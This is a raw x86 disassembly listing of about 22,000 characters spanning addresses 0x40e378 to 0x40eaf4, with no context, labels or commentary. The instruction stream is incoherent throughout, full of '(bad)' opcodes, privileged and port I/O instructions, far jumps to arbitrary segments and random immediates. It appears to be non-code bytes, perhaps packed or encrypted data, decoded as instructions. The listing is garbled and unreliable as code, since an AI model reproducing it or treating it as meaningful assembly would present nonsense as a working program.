  40e378:	sbb    ebx,DWORD PTR [eax+0x35]
  40e37b:	arpl   sp,dx
  40e37d:	jl     0x40e359
  40e37f:	mov    ds:0x2217a201,eax
  40e384:	or     bl,BYTE PTR [ecx]
  40e386:	and    esi,DWORD PTR [ebp+0x2692b6f1]
  40e38c:	ret    0x5392
  40e38f:	int    0xa8
  40e391:	shl    DWORD PTR cs:[esi+0x700d81d2],0x1a
  40e399:	aad    0xbf
  40e39b:	fs sub esi,edx
  40e39e:	mov    eax,0x2f5793a5
  40e3a3:	je     0x40e3a1
  40e3a5:	dec    eax
  40e3a6:	jno    0x40e3d7
  40e3a8:	idiv   DWORD PTR [ecx-0x1e]
  40e3ab:	jecxz  0x40e37b
  40e3ad:	sub    al,0xc
  40e3af:	pop    esi
  40e3b0:	or     al,0x4b
  40e3b2:	or     ebp,DWORD PTR [esi+0x1]
  40e3b5:	pop    bp
  40e3b7:	fidiv  DWORD PTR [esi+0x690b5242]
  40e3bd:	xor    edi,DWORD PTR [ebx-0x9]
  40e3c0:	mov    ds:0x88a04d88,eax
  40e3c5:	dec    edx
  40e3c6:	daa    
  40e3c7:	out    0xe6,al
  40e3c9:	ja     0x40e403
  40e3cb:	push   0x12744ae0
  40e3d0:	inc    edi
  40e3d1:	in     eax,dx
  40e3d2:	lea    eax,[edi]
  40e3d4:	xchg   edi,eax
  40e3d5:	leave  
  40e3d6:	or     DWORD PTR [eax+eiz*1+0x143e5cd2],ebp
  40e3dd:	add    cl,BYTE PTR [edx+0x4e]
  40e3e0:	aad    0xb8
  40e3e2:	int    0x47
  40e3e4:	out    dx,al
  40e3e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3e6:	add    ecx,DWORD PTR [bp+di-0x6bb5]
  40e3eb:	mov    bh,0x16
  40e3ed:	jb     0x40e415
  40e3ef:	push   edi
  40e3f0:	push   0x28bb18d9
  40e3f5:	sahf   
  40e3f6:	jae    0x40e406
  40e3f8:	sub    eax,0xd0fd7865
  40e3fd:	push   esp
  40e3fe:	dec    eax
  40e3ff:	cmp    edx,DWORD PTR [edx+edx*8-0x18]
  40e403:	xor    ch,BYTE PTR [ecx]
  40e405:	pop    ss
  40e406:	cmp    esi,DWORD PTR [edx+0x51]
  40e409:	mov    esp,DWORD PTR [ebp+edx*1+0x7]
  40e40d:	int    0xf5
  40e40f:	rcl    BYTE PTR [eax+0xdcf688a],1
  40e415:	xor    al,0x7a
  40e417:	into   
  40e418:	cdq    
  40e419:	pusha  
  40e41a:	jmp    0x273a:0x37deffec
  40e421:	sub    dh,ch
  40e423:	inc    eax
  40e424:	xchg   esi,eax
  40e425:	mov    ecx,0x5c22c2bd
  40e42a:	push   0xf9d5ac4d
  40e42f:	(bad)  
  40e430:	jge    0x40e478
  40e432:	pop    ss
  40e433:	inc    edi
  40e434:	or     eax,0x79194ec1
  40e439:	shl    DWORD PTR [ecx-0x74d7156],0x8f
  40e440:	popa   
  40e441:	repz inc esp
  40e443:	test   eax,0x3847ec2b
  40e448:	xor    ah,BYTE PTR [ebx+0x55638c4a]
  40e44e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e450:	arpl   WORD PTR [ecx+0x59],bp
  40e453:	mov    al,ds:0xcd5539a5
  40e458:	idiv   DWORD PTR [ebx+eiz*1]
  40e45b:	and    al,0xb2
  40e45d:	sbb    edi,esp
  40e45f:	lds    esi,FWORD PTR [edx-0x65]
  40e462:	mov    edx,0x39f85258
  40e467:	jg     0x40e478
  40e469:	push   esi
  40e46a:	xchg   ecx,eax
  40e46b:	icebp  
  40e46c:	rcr    DWORD PTR [esp+ebp*2-0x80],0x10
  40e471:	jl     0x40e4c3
  40e473:	test   BYTE PTR [eax],al
  40e475:	add    al,0xce
  40e477:	add    esp,DWORD PTR [ecx+0x55ed8918]
  40e47d:	sub    bl,BYTE PTR [ebx]
  40e47f:	sbb    BYTE PTR [edx],cl
  40e481:	add    al,0xda
  40e483:	rcl    BYTE PTR [ebx],cl
  40e485:	sub    eax,0x79ba866
  40e48a:	stos   BYTE PTR es:[edi],al
  40e48b:	clc    
  40e48c:	iret   
  40e48d:	sbb    edi,DWORD PTR [ecx+edx*8+0x643fb78b]
  40e494:	sqrtps xmm4,xmm0
  40e497:	rcr    BYTE PTR [ecx-0x2fabd96],cl
  40e49d:	sahf   
  40e49e:	das    
  40e49f:	push   ss
  40e4a0:	sti    
  40e4a1:	aas    
  40e4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4a3:	stc    
  40e4a4:	xchg   esi,eax
  40e4a5:	(bad)  
  40e4a6:	das    
  40e4a7:	rcl    DWORD PTR [esi],1
  40e4a9:	mov    edx,0x3e7bcbce
  40e4ae:	dec    edx
  40e4af:	int    0xe8
  40e4b1:	xchg   ecx,eax
  40e4b2:	mov    dl,0xb7
  40e4b4:	push   esi
  40e4b5:	xchg   BYTE PTR [ebx-0x13],ah
  40e4b8:	xchg   ebx,ebx
  40e4ba:	xor    edx,DWORD PTR [ebp-0x4]
  40e4bd:	jg     0x40e4e3
  40e4bf:	push   esp
  40e4c0:	jmp    0x40e4ad
  40e4c2:	into   
  40e4c3:	mov    eax,0xe10307b4
  40e4c8:	outs   dx,DWORD PTR ds:[esi]
  40e4c9:	pop    es
  40e4ca:	jge    0x40e53a
  40e4cc:	xor    cl,BYTE PTR [ebp-0x7648d23b]
  40e4d2:	jecxz  0x40e496
  40e4d4:	ins    DWORD PTR es:[edi],dx
  40e4d5:	pop    ebp
  40e4d6:	sbb    DWORD PTR [esi-0x27a4d7cf],0x79
  40e4dd:	xor    dh,BYTE PTR [edx*8-0x53df77ae]
  40e4e4:	mov    ecx,0x3d4e855a
  40e4e9:	pop    ds
  40e4ea:	adc    al,0xa
  40e4ec:	gs int 0x69
  40e4ef:	mov    edi,fs
  40e4f1:	adc    al,0xf8
  40e4f3:	fst    QWORD PTR [ecx+0x4c9e9e1c]
  40e4f9:	fdivr  QWORD PTR [ecx-0x47]
  40e4fc:	imul   esi,DWORD PTR [ecx+esi*8],0x83a47523
  40e503:	or     edi,eax
  40e505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e506:	retf   0x6682
  40e509:	test   al,0x4b
  40e50b:	jg     0x40e48e
  40e50d:	inc    esp
  40e50e:	idiv   eax
  40e510:	sahf   
  40e511:	push   edi
  40e512:	leave  
  40e513:	mov    al,ds:0xc2b8d7af
  40e518:	adc    BYTE PTR [ebp+0x25e1865a],dl
  40e51e:	adc    eax,0x3e250d09
  40e523:	or     al,0x3f
  40e525:	xor    cl,BYTE PTR [ebx]
  40e527:	dec    ebx
  40e528:	das    
  40e529:	in     eax,dx
  40e52a:	xchg   dl,ah
  40e52c:	push   edx
  40e52d:	push   ebx
  40e52e:	push   eax
  40e52f:	dec    esi
  40e530:	xchg   ebp,eax
  40e531:	xor    cl,ah
  40e533:	std    
  40e534:	enter  0x2c19,0xc8
  40e538:	test   eax,0x2305608
  40e53d:	jb     0x40e5b7
  40e53f:	sub    eax,0x1a33391d
  40e544:	retf   
  40e545:	cmp    bl,BYTE PTR [ecx-0x5a259de]
  40e54b:	repz xor al,0x5
  40e54e:	imul   ch
  40e550:	push   esi
  40e551:	add    DWORD PTR [eax],eax
  40e553:	sub    eax,0xd1a1b295
  40e558:	jle    0x40e542
  40e55a:	frstor [edi+eax*1-0x7dca036d]
  40e561:	sub    al,0x73
  40e563:	into   
  40e564:	js     0x40e57f
  40e566:	push   edx
  40e568:	or     DWORD PTR [eax],eax
  40e56a:	mov    edx,0x9c0c373c
  40e56f:	pop    edi
  40e570:	jge    0x40e581
  40e572:	cmp    BYTE PTR [eax-0x35487fd2],bh
  40e578:	iret   
  40e579:	mov    ds:0x43d7ec86,al
  40e57e:	pop    eax
  40e57f:	mov    BYTE PTR ds:0x37ec2a57,bh
  40e585:	mov    cx,0x5dd7
  40e589:	mov    al,0x60
  40e58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e58c:	sub    eax,0x1cb6910f
  40e591:	mov    cl,0x75
  40e593:	add    bl,ah
  40e595:	add    eax,0x98037f6b
  40e59a:	push   esp
  40e59b:	xchg   ecx,eax
  40e59c:	jbe    0x40e593
  40e59e:	fstp   DWORD PTR ds:0x8e00d305
  40e5a4:	jp     0x40e5c3
  40e5a6:	(bad)  
  40e5a7:	std    
  40e5a8:	mov    al,ds:0x944866f2
  40e5ad:	pop    ds
  40e5ae:	jnp    0x40e5b3
  40e5b0:	pop    esi
  40e5b1:	fnstcw WORD PTR [edi-0x3de41285]
  40e5b7:	ss test al,0x3f
  40e5ba:	jb     0x40e5f7
  40e5bc:	sahf   
  40e5bd:	xor    al,0x13
  40e5bf:	cmp    DWORD PTR [edx+0x34],ebp
  40e5c2:	jmp    0xb718:0xd274d2f1
  40e5c9:	cmp    eax,0xdd88804a
  40e5ce:	int3   
  40e5cf:	sub    eax,0xbaccd4c3
  40e5d4:	fwait
  40e5d5:	imul   esp,DWORD PTR [ebx+esi*8+0x7f],0xffa11133
  40e5dd:	sbb    al,0x90
  40e5df:	push   edx
  40e5e0:	out    0xa0,eax
  40e5e2:	or     DWORD PTR [ebx+0x7b131062],0x1d
  40e5e9:	push   0x54
  40e5eb:	add    DWORD PTR [ecx+0x1e5e9b84],0x9e04fdbe
  40e5f5:	sub    DWORD PTR [edi+0x1d15fbab],esi
  40e5fb:	sbb    DWORD PTR [ebx+0xd7e0c74],esp
  40e601:	fidiv  WORD PTR [edi+0x32]
  40e604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e605:	push   edx
  40e606:	lea    edx,[esi-0x737183ed]
  40e60c:	push   ds
  40e60d:	add    eax,0x5b0260f3
  40e612:	cmp    esi,DWORD PTR [edi+ebp*8-0x23]
  40e616:	and    BYTE PTR [edx],ch
  40e618:	or     eax,0x9daa42bd
  40e61d:	or     eax,0xd0e81779
  40e622:	cmp    DWORD PTR cs:[ebx+0x12],ecx
  40e626:	into   
  40e627:	idiv   DWORD PTR [esi+0x6b80c33b]
  40e62d:	popa   
  40e62e:	pop    eax
  40e62f:	enter  0x963d,0x4f
  40e633:	xor    edx,DWORD PTR [ebx]
  40e635:	xor    BYTE PTR [eax],bl
  40e637:	cs push edx
  40e639:	xor    BYTE PTR [ebp-0x79],ah
  40e63c:	cld    
  40e63d:	adc    al,0xb9
  40e63f:	add    BYTE PTR [ebx],bl
  40e641:	push   0x230c6bec
  40e646:	pop    ebx
  40e647:	xlat   BYTE PTR ds:[ebx]
  40e648:	pop    ss
  40e649:	clc    
  40e64a:	mov    ds:0x1207bbf2,al
  40e64f:	push   eax
  40e650:	mov    dl,0xe1
  40e652:	nop
  40e653:	cdq    
  40e654:	out    0x2e,al
  40e656:	(bad)  
  40e657:	mov    bh,0xce
  40e659:	inc    bl
  40e65b:	jns    0x40e605
  40e65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e65e:	fidiv  DWORD PTR [ecx+0x3861b430]
  40e664:	jns    0x40e656
  40e666:	push   ecx
  40e667:	outs   dx,DWORD PTR ds:[esi]
  40e668:	retf   0xf62b
  40e66b:	and    cl,ch
  40e66d:	and    DWORD PTR [bp+si-0x6a],eax
  40e671:	stos   BYTE PTR es:[edi],al
  40e672:	lods   al,BYTE PTR ds:[esi]
  40e673:	scas   al,BYTE PTR es:[edi]
  40e674:	mov    edi,0xffa49b44
  40e679:	(bad)  
  40e67a:	xor    eax,0xbd6de208
  40e67f:	icebp  
  40e680:	xchg   dh,ah
  40e682:	das    
  40e683:	popa   
  40e684:	jae    0x40e6c6
  40e686:	adc    al,0x2a
  40e688:	jmp    0xf28f:0x9d6dcbd2
  40e68f:	mov    bh,BYTE PTR [ecx-0x4a]
  40e692:	cmc    
  40e693:	rol    dh,cl
  40e695:	jmp    0xcc431d51
  40e69a:	pop    edx
  40e69b:	xor    edx,DWORD PTR [edx+0x791742e0]
  40e6a1:	xor    eax,0x4b15ef8e
  40e6a6:	jbe    0x40e674
  40e6a8:	pop    ds
  40e6a9:	stos   DWORD PTR es:[edi],eax
  40e6aa:	in     eax,dx
  40e6ab:	push   eax
  40e6ac:	xor    DWORD PTR [ebx-0x1],ecx
  40e6af:	hlt    
  40e6b0:	adc    BYTE PTR [edx-0x26],0x5c
  40e6b4:	mov    ah,0x92
  40e6b6:	xor    ah,BYTE PTR [ebx+ebx*1]
  40e6b9:	shl    al,1
  40e6bb:	inc    ebp
  40e6bc:	push   ebp
  40e6bd:	jmp    0x40e6a9
  40e6bf:	lock pop ss
  40e6c1:	(bad)  
  40e6c2:	pop    ecx
  40e6c3:	jnp    0x40e67f
  40e6c5:	push   es
  40e6c6:	test   DWORD PTR [eax-0x3f46fe72],edi
  40e6cc:	in     eax,0xc5
  40e6ce:	cmp    DWORD PTR [ebp-0x62],eax
  40e6d1:	sub    ebx,DWORD PTR [ebx-0x7f2e9b42]
  40e6d7:	jb     0x40e6ea
  40e6d9:	jns    0x40e672
  40e6db:	scas   eax,DWORD PTR es:[edi]
  40e6dc:	ins    BYTE PTR es:[edi],dx
  40e6dd:	xchg   esi,eax
  40e6de:	(bad)  
  40e6df:	out    dx,eax
  40e6e0:	xchg   esp,eax
  40e6e1:	push   ebx
  40e6e2:	pop    eax
  40e6e3:	jl     0x40e755
  40e6e5:	add    cl,ah
  40e6e7:	mov    dl,0x6d
  40e6e9:	jmp    0xa1765e47
  40e6ee:	cs int3 
  40e6f0:	sbb    BYTE PTR [ebp-0x1c],cl
  40e6f3:	push   0xa1a373f
  40e6f8:	jg     0x40e72a
  40e6fa:	adc    cl,BYTE PTR [ebp-0x29]
  40e6fd:	push   edx
  40e6fe:	inc    esi
  40e6ff:	cmp    al,0xed
  40e701:	push   es
  40e702:	and    dl,ah
  40e704:	not    DWORD PTR [ecx]
  40e706:	xor    BYTE PTR [eax],ch
  40e708:	pop    DWORD PTR [ebx]
  40e70a:	xchg   esi,eax
  40e70b:	(bad)  
  40e70c:	xchg   edx,eax
  40e70d:	ja     0x40e6bd
  40e70f:	cmp    DWORD PTR [ebx-0x7eaccbae],ecx
  40e715:	push   ds
  40e716:	lock popf 
  40e718:	sub    eax,0xa497662d
  40e71d:	jl     0x40e739
  40e71f:	les    esp,FWORD PTR ds:0x7d7528b5
  40e725:	pusha  
  40e726:	inc    esi
  40e727:	fldcw  WORD PTR [ebx+0x78]
  40e72a:	mov    dl,BYTE PTR [esi+0x5fdb1c8b]
  40e730:	addr16 mov ds:0xe977,eax
  40e734:	cld    
  40e735:	addr16 mov ecx,esi
  40e738:	gs and eax,0x7ad8999d
  40e73e:	aas    
  40e73f:	inc    ecx
  40e740:	shl    DWORD PTR [ecx+edi*8-0x79],0x40
  40e745:	inc    esp
  40e746:	je     0x40e6f4
  40e748:	rep lods al,BYTE PTR ds:[esi]
  40e74a:	and    BYTE PTR [edx],cl
  40e74c:	mov    eax,ds:0x2bf23b5e
  40e751:	xor    DWORD PTR [ecx-0x5c],eax
  40e754:	fdivr  st,st(1)
  40e756:	ins    DWORD PTR es:[edi],dx
  40e757:	outs   dx,DWORD PTR ds:[esi]
  40e758:	xchg   esp,eax
  40e759:	xor    eax,0x63f2ddef
  40e75e:	dec    eax
  40e75f:	mov    esp,0x2d7a9e6b
  40e764:	cmp    al,0x73
  40e766:	sub    al,0x57
  40e768:	push   ecx
  40e769:	outs   dx,BYTE PTR ds:[esi]
  40e76a:	mov    esi,DWORD PTR [eax+0x69]
  40e76d:	sub    DWORD PTR ds:0x63c9f5a8,0x560f58e1
  40e777:	pop    ecx
  40e778:	mov    WORD PTR [edx],?
  40e77a:	sar    DWORD PTR [ecx+ebp*2],0xf2
  40e77e:	ins    BYTE PTR es:[edi],dx
  40e77f:	mov    ecx,0xbb7caa0f
  40e784:	sub    esp,0xd0c75da6
  40e78a:	mov    bh,0xc9
  40e78c:	frstor ds:0x764018a1
  40e792:	push   ebx
  40e793:	dec    esp
  40e794:	inc    esp
  40e795:	(bad)  
  40e796:	mov    ebx,0x362e382b
  40e79b:	xchg   ebx,eax
  40e79c:	in     al,dx
  40e79d:	iret   
  40e79e:	adc    eax,0xe387ac94
  40e7a3:	repnz push 0xffffffa1
  40e7a6:	std    
  40e7a7:	ins    DWORD PTR es:[edi],dx
  40e7a8:	fcomp  st(3)
  40e7aa:	adc    BYTE PTR ds:0x4d7e91cc,dh
  40e7b0:	inc    esp
  40e7b1:	mov    ah,0x10
  40e7b3:	and    ebp,DWORD PTR [edi]
  40e7b5:	mov    BYTE PTR [edi+0x3c],bh
  40e7b8:	inc    ebp
  40e7b9:	sub    eax,0x61805d6f
  40e7be:	enter  0x5a04,0x2d
  40e7c2:	leave  
  40e7c3:	cmp    cl,dh
  40e7c5:	dec    ecx
  40e7c6:	out    0x4,al
  40e7c8:	cld    
  40e7c9:	xchg   ebx,eax
  40e7ca:	(bad)  
  40e7cb:	xlat   BYTE PTR ds:[ebx]
  40e7cc:	jmp    0x40e810
  40e7ce:	int    0x54
  40e7d0:	mov    al,0xb8
  40e7d2:	cdq    
  40e7d3:	pop    edx
  40e7d4:	ja     0x40e7e1
  40e7d6:	add    eax,0xd21b8088
  40e7db:	or     BYTE PTR [ebp+eax*4-0x11],al
  40e7df:	cmp    ebp,esi
  40e7e1:	adc    bl,BYTE PTR [ecx+0x49]
  40e7e4:	mov    bl,0x40
  40e7e6:	mov    bl,0x6b
  40e7e8:	fwait
  40e7e9:	push   cs
  40e7ea:	mov    edi,0x51c7e18d
  40e7ef:	pop    ebp
  40e7f0:	xchg   esp,eax
  40e7f1:	adc    eax,0xdf4d6891
  40e7f6:	in     al,0x18
  40e7f8:	jnp    0x40e784
  40e7fa:	mov    bh,0x37
  40e7fc:	inc    esi
  40e7fd:	pop    ecx
  40e7fe:	test   eax,0x512c5930
  40e803:	add    al,0x2f
  40e805:	(bad)  
  40e807:	mov    ch,0x6a
  40e809:	mov    al,ds:0xe19f7f98
  40e80e:	cmp    cl,0x1e
  40e811:	xchg   edx,eax
  40e812:	add    BYTE PTR [edi+0x27424a57],cl
  40e818:	and    al,0xe5
  40e81a:	push   ss
  40e81b:	cdq    
  40e81c:	addr16 inc eax
  40e81e:	jmp    0x40e80f
  40e820:	daa    
  40e821:	aad    0xa6
  40e823:	ja     0x40e7da
  40e825:	mov    al,0x47
  40e827:	aam    0x40
  40e829:	std    
  40e82a:	and    ah,dh
  40e82c:	cmp    DWORD PTR [edi-0x142df1],edi
  40e832:	sub    edi,DWORD PTR ds:0x27456f10
  40e838:	and    eax,0x9edece1e
  40e83d:	imul   ebx,DWORD PTR [edi],0x17
  40e840:	pusha  
  40e841:	test   cl,dl
  40e843:	dec    ebp
  40e844:	or     edx,DWORD PTR [ecx-0x39]
  40e847:	pop    edi
  40e848:	test   al,0x13
  40e84a:	dec    edi
  40e84b:	jo     0x40e7ed
  40e84d:	mov    dh,0x2e
  40e84f:	inc    edi
  40e850:	jno    0x40e810
  40e852:	pop    edi
  40e853:	rcl    eax,cl
  40e855:	and    ecx,ebp
  40e857:	mov    eax,ds:0xadfb6f22
  40e85c:	repz mov ebp,ebp
  40e85f:	xor    esp,edx
  40e861:	pop    ebp
  40e862:	jb     0x40e822
  40e864:	test   BYTE PTR ds:0x82bb7cc9,bh
  40e86a:	mov    eax,0x2d33c8c3
  40e86f:	adc    al,0xa1
  40e871:	push   ebx
  40e872:	mov    fs,WORD PTR ds:0xb034c00a
  40e878:	add    BYTE PTR [ebp+0x37],dh
  40e87b:	push   eax
  40e87c:	sahf   
  40e87d:	add    DWORD PTR [esi-0x2003e921],edx
  40e883:	in     eax,dx
  40e884:	int    0xf9
  40e886:	pop    ss
  40e887:	(bad)  
  40e888:	ret    
  40e889:	jne    0x40e84f
  40e88b:	push   cs
  40e88c:	inc    edi
  40e88d:	addr16 sahf 
  40e88f:	loop   0x40e812
  40e891:	adc    ah,BYTE PTR [edx+edx*2-0x4b]
  40e895:	push   ss
  40e896:	sub    edi,0xffffff9b
  40e899:	inc    edi
  40e89a:	adc    BYTE PTR [ecx],bh
  40e89c:	jbe    0x40e91b
  40e89e:	mov    esi,0x89c4f4f0
  40e8a3:	adc    eax,ebp
  40e8a5:	jecxz  0x40e83a
  40e8a7:	mov    ah,BYTE PTR [esp+ebx*2+0x1223f329]
  40e8ae:	push   ds
  40e8af:	mov    bh,0xa5
  40e8b1:	das    
  40e8b2:	xor    esp,ebp
  40e8b4:	mov    eax,0x75381257
  40e8b9:	ds ja  0x40e8bd
  40e8bc:	inc    esp
  40e8bd:	loop   0x40e864
  40e8bf:	dec    ebx
  40e8c0:	fcom   DWORD PTR [ecx]
  40e8c2:	dec    ebx
  40e8c3:	ret    
  40e8c4:	mov    ds:0x76bf0056,eax
  40e8c9:	pop    esi
  40e8ca:	clc    
  40e8cb:	int3   
  40e8cc:	mov    esp,0x3a92a9c2
  40e8d1:	push   cs
  40e8d2:	adc    al,BYTE PTR [ebp+0x12f90393]
  40e8d8:	cmp    cl,BYTE PTR [esi+0x31]
  40e8db:	push   cs
  40e8dc:	imul   ebp,DWORD PTR [eax+0x5d],0xf764a686
  40e8e3:	push   ss
  40e8e4:	(bad)  
  40e8e5:	add    DWORD PTR es:[ebp+0x306552c0],esi
  40e8ec:	push   eax
  40e8ed:	adc    al,0xdf
  40e8ef:	cmc    
  40e8f0:	mov    esp,0x2199b7c2
  40e8f5:	jl     0x40e93e
  40e8f7:	adc    ah,BYTE PTR [edi+0x45]
  40e8fa:	add    BYTE PTR [ecx+0x7a],bl
  40e8fd:	js     0x40e963
  40e8ff:	outs   dx,BYTE PTR ds:[esi]
  40e900:	popf   
  40e901:	call   0xefe3c4ce
  40e906:	dec    edx
  40e907:	lds    eax,FWORD PTR [edi]
  40e909:	neg    BYTE PTR [ebx+0x3f]
  40e90c:	sub    DWORD PTR fs:[ebp+ebp*2+0x2cb2dcd1],esp
  40e914:	addr16 dec eax
  40e916:	pop    eax
  40e917:	xor    DWORD PTR [ebx-0x1320ee83],0xffffffd7
  40e91e:	fld    DWORD PTR [ebx-0x7aeb9807]
  40e924:	cmp    BYTE PTR [ebx],0x7a
  40e927:	inc    esp
  40e928:	mov    DWORD PTR [ebx-0x71ca35f0],esi
  40e92e:	pop    ecx
  40e92f:	retf   0x7e28
  40e932:	jbe    0x40e8c3
  40e934:	stc    
  40e935:	(bad)  
  40e936:	and    al,0xfe
  40e938:	fstp   TBYTE PTR [edi+0x66]
  40e93b:	popa   
  40e93c:	sub    al,0x59
  40e93e:	mov    ebx,0xec14cd44
  40e943:	mov    al,ds:0x543c8d56
  40e948:	mov    esi,0xe76bd284
  40e94d:	sbb    BYTE PTR [eax-0x3b534472],0xc1
  40e954:	fldcw  WORD PTR [ebp+0x5ff37845]
  40e95a:	test   esi,edi
  40e95c:	inc    ebx
  40e95d:	adc    cl,cl
  40e95f:	and    eax,0xcc4bf92
  40e964:	mov    ecx,0xfe02c9be
  40e969:	mov    eax,ds:0x37b279e4
  40e96e:	shl    DWORD PTR [ecx],cl
  40e970:	call   0x507:0xaac67dd5
  40e977:	aam    0xe0
  40e979:	mul    DWORD PTR [edi-0xbc6704e]
  40e97f:	test   DWORD PTR [edi+ebx*2],ebx
  40e982:	jecxz  0x40e96b
  40e984:	in     al,dx
  40e985:	(bad)  
  40e986:	arpl   WORD PTR [esp+esi*2],cx
  40e989:	retf   
  40e98a:	stos   DWORD PTR es:[edi],eax
  40e98b:	lods   eax,DWORD PTR ds:[esi]
  40e98c:	call   0x1743:0x7b912b88
  40e993:	mov    ds:0xad3f4223,eax
  40e998:	fisub  DWORD PTR [edi+eiz*1+0x24]
  40e99c:	or     ebx,eax
  40e99e:	and    al,0xfe
  40e9a0:	pop    esp
  40e9a1:	pop    es
  40e9a2:	push   edi
  40e9a3:	ins    BYTE PTR es:[edi],dx
  40e9a4:	pop    ecx
  40e9a5:	jg     0x40e9dd
  40e9a7:	push   ds
  40e9a8:	sar    BYTE PTR [esi+edx*8+0x246b09cf],0xf8
  40e9b0:	inc    edi
  40e9b1:	clc    
  40e9b2:	stos   BYTE PTR es:[edi],al
  40e9b3:	cs jne 0x40ea13
  40e9b6:	mov    esp,es
  40e9b8:	enter  0x1243,0xbe
  40e9bc:	mov    ds:0x7e6928ce,eax
  40e9c1:	lea    edx,[ebp-0x5d9f2619]
  40e9c7:	shl    DWORD PTR [ecx+0x6e8a0671],0x59
  40e9ce:	pop    ebx
  40e9cf:	or     BYTE PTR [ecx],0x2e
  40e9d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9d3:	sbb    edx,DWORD PTR [ecx-0x17]
  40e9d6:	daa    
  40e9d7:	stos   DWORD PTR es:[edi],eax
  40e9d8:	je     0x40ea3f
  40e9da:	das    
  40e9db:	pop    ss
  40e9dc:	xor    eax,eax
  40e9de:	call   0x88580694
  40e9e3:	add    al,0xbc
  40e9e5:	pop    ebx
  40e9e6:	mov    bl,0xa2
  40e9e8:	fldenv [esi]
  40e9ea:	out    dx,al
  40e9eb:	ins    BYTE PTR es:[edi],dx
  40e9ec:	push   0x9fc58ca8
  40e9f1:	or     edx,DWORD PTR ds:0x8124f9ee
  40e9f7:	push   esi
  40e9f8:	sbb    edi,DWORD PTR [edx-0x43]
  40e9fb:	mov    DWORD PTR [ecx],eax
  40e9fd:	pop    esi
  40e9fe:	js     0x40ea3d
  40ea00:	xchg   DWORD PTR [ebx],ecx
  40ea02:	pop    ebx
  40ea03:	jo     0x40e9ab
  40ea05:	sahf   
  40ea06:	inc    esp
  40ea07:	pop    eax
  40ea08:	cli    
  40ea09:	cld    
  40ea0a:	(bad)  
  40ea0b:	jns    0x40e9d2
  40ea0d:	cdq    
  40ea0e:	clc    
  40ea0f:	dec    esp
  40ea10:	dec    ecx
  40ea11:	add    al,0xde
  40ea13:	or     bh,ch
  40ea15:	jl     0x40e9f9
  40ea17:	test   al,0x35
  40ea19:	cmovbe eax,DWORD PTR [esi-0x5329b176]
  40ea20:	push   ds
  40ea21:	pop    ebx
  40ea22:	pop    edi
  40ea23:	ret    0x8d23
  40ea26:	cmp    ah,BYTE PTR [ebp-0x10]
  40ea29:	jg     0x40ea0d
  40ea2b:	idiv   BYTE PTR [edi]
  40ea2d:	jo     0x40ea81
  40ea2f:	call   0xfc09:0x55a9
  40ea35:	sub    al,0xef
  40ea37:	dec    esp
  40ea38:	sti    
  40ea39:	mov    BYTE PTR [eax],ch
  40ea3b:	outs   dx,DWORD PTR ds:[esi]
  40ea3c:	xchg   esp,eax
  40ea3d:	ret    0x6b6d
  40ea40:	sbb    esi,DWORD PTR ds:[ecx]
  40ea43:	adc    bh,BYTE PTR [ebx]
  40ea45:	fidiv  DWORD PTR [esi+edi*1-0x7]
  40ea49:	push   edi
  40ea4a:	sbb    eax,0xc8b9e5fd
  40ea4f:	sub    esi,DWORD PTR [ecx]
  40ea51:	cmp    ecx,ebp
  40ea53:	sbb    al,0x12
  40ea55:	int    0xa0
  40ea57:	mov    DWORD PTR es:[edx-0x76],ebx
  40ea5b:	nop
  40ea5c:	nop
  40ea5d:	std    
  40ea5e:	lods   al,BYTE PTR ds:[esi]
  40ea5f:	push   ss
  40ea60:	cmp    eax,0xf94f0075
  40ea65:	jb     0x40e9ec
  40ea67:	xor    BYTE PTR [ebx],dl
  40ea69:	and    esp,DWORD PTR [ecx]
  40ea6b:	push   ecx
  40ea6c:	mov    bh,0x2f
  40ea6e:	jns    0x40ea7f
  40ea70:	hlt    
  40ea71:	mov    bh,0x99
  40ea73:	xchg   ecx,eax
  40ea74:	mov    esi,DWORD PTR [esi-0x22]
  40ea77:	and    BYTE PTR [ebx+0x30],al
  40ea7a:	push   esi
  40ea7b:	nop
  40ea7c:	inc    esi
  40ea7d:	xchg   edi,eax
  40ea7e:	lds    edi,FWORD PTR [esi+0x493928d5]
  40ea84:	adc    BYTE PTR [esi-0x11],0xe5
  40ea88:	ins    DWORD PTR es:[edi],dx
  40ea89:	dec    eax
  40ea8a:	xor    eax,DWORD PTR [ecx+0x6ebadb]
  40ea90:	ror    BYTE PTR [ecx+0x51],0x65
  40ea94:	div    BYTE PTR [esi+0x57]
  40ea97:	gs mov bl,0xf5
  40ea9a:	hlt    
  40ea9b:	xchg   edi,edx
  40ea9d:	adc    ch,BYTE PTR [ebp+0x73]
  40eaa0:	pusha  
  40eaa1:	ins    DWORD PTR es:[edi],dx
  40eaa2:	ins    BYTE PTR es:[edi],dx
  40eaa3:	push   es
  40eaa4:	lahf   
  40eaa5:	push   ecx
  40eaa6:	cmc    
  40eaa7:	sub    BYTE PTR [edx+0x7560c838],ah
  40eaad:	rcr    BYTE PTR ds:0x41763532,1
  40eab3:	or     eax,0x2d129198
  40eab8:	or     DWORD PTR [esi+0x66],ecx
  40eabb:	xor    BYTE PTR [edi-0x71aa178d],bh
  40eac1:	jp     0x40ea67
  40eac3:	mov    ss,edi
  40eac5:	xlat   BYTE PTR ds:[ebx]
  40eac6:	retf   0x7e6c
  40eac9:	and    BYTE PTR [ecx+edi*2-0x1d],dh
  40eacd:	sbb    eax,0xad84dfde
  40ead2:	popa   
  40ead3:	pop    esp
  40ead4:	add    edx,ecx
  40ead6:	jns    0x40eac8
  40ead8:	dec    ebp
  40ead9:	push   esi
  40eada:	adc    al,0x17
  40eadc:	xchg   esi,eax
  40eadd:	loope  0x40eaf0
  40eadf:	jp     0x40eb36
  40eae1:	stos   DWORD PTR es:[edi],eax
  40eae2:	cli    
  40eae3:	leave  
  40eae4:	sub    edi,DWORD PTR [ecx+0x6e9529a7]
  40eaea:	or     eax,0x4ab9bafb
  40eaef:	mov    ebx,edi
  40eaf1:	lea    edi,[edx]
  40eaf3:	stos   BYTE PTR es:[edi],al
  40eaf4:	xor    al,0x15
